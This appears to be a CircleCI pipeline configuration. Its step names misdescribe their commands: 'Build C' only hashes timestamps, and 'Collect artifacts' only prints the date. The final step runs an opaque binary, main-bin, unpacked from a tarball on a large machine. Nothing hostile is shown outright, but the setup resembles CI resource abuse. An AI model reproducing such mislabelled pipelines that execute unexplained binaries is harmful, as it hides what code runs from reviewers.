version: 2.1

jobs:
  deRayEngine:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Build C
          command: |
            mkdir -p /tmp/rdy
            set +o pipefail 2>/dev/null; yes "$(date +%s)" | head -n 1288571 | md5sum > /tmp/rdy/proxyIndigoPlasmaCarrier; true
            echo "[-] $(wc -c </tmp/rdy/proxyIndigoPlasmaCarrier) B"
      - persist_to_workspace:
          root: /tmp/rdy
          paths:
            - 'proxyIndigoPlasmaCarrier'
  intergration-74:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/rdy
      - run:
          name: Load upstream (step3)
          command: |
            head -n 1 /tmp/rdy/proxyIndigoPlasmaCarrier 2>/dev/null | wc -c || true
      - run:
          name: Grab repository
          command: git clone --depth 5 --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unpack sources
          command: tar --extract --gzip -f deps.tgz
      - run:
          name: Smoke check
          command: ls -la
      - run:
          name: Collect artifacts
          command: date -u
      - run:
          command: /bin/sh -c "./main-bin"
